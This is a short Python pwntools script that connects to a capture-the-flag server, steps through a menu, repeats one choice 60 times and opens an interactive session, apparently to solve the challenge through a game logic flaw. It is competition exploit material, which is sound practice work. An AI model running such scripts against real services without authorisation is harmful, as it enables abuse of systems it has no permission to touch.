from pwn import *

p = remote("ctf.umbccd.io", 4400)

p.sendlineafter(":", "2")
p.sendlineafter("flag", "2")

for i in range(60):
  p.sendlineafter("Choice:", "1")
  p.sendlineafter("tarantula", "5")

p.sendlineafter("Choice:", "1")
p.sendlineafter("tarantula", "1")

p.interactive()
